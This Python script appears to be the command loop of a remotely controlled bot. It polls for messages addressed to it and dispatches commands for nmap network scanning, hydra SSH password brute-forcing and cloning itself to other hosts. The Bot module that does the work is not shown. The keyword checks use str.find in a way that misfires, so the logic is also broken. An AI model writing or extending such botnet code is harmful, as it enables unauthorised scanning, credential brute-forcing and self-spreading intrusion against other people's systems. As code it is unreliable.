import Bot


def main():
    bot = Bot.Bot()
    update = bot.request_update()

    while(1):
        update = bot.request_update()

        if (bot.is_it_for_me(update['name'], update['text'])):
            update = update['text'].split(' : ')

            if (update[-1].find('nmap')):
                bot.nmap(update[-1])

            if (update[-1].find('hydra_ssh')):
                bot.hydra_ssh(update[-1])

            if (update[-1].find('clone_to')):
                bot.bot_clone(update[-1])




if __name__ == '__main__':
    main()

